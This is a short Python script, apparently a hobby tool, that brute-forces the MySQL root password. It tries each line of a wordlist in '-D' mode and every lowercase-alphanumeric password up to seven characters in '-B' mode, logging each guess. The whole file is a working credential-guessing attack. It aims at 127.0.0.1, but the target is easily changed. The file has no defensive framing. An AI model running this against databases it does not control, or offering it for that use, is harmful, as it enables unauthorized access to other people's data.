import mysql.connector
import sys
import itertools
import string


try:
  flag = sys.argv[1]
  if flag == "-D":
    filename = sys.argv[2]

    file = open(filename, 'r')
    password = file.readline()


    while password:
      password = password.strip()
      try:
        conn = mysql.connector.connect(user='root', host='127.0.0.1', password=password)
        print("[*] " + password + " | succeed")
        break
      except:
        print("[*] " + password + " | failed")
      password = file.readline()
    
    file.close()
  elif flag == "-B":
    password_char = string.ascii_lowercase + string.digits
    is_end = False
    for password_length in range(1, 8):
      for guess in itertools.product(password_char, repeat=password_length):
        guess = ''.join(guess)
        try:
          conn = mysql.connector.connect(user='root', host='127.0.0.1', password=guess)
          print("[*] " + guess + " | succeed")
          is_end = True
          break
        except KeyboardInterrupt:
          is_end = True
          break
        except:
          print("[*] " + guess + " | failed")
      if is_end == True:
        break

except:
  print("please type in the write arugments")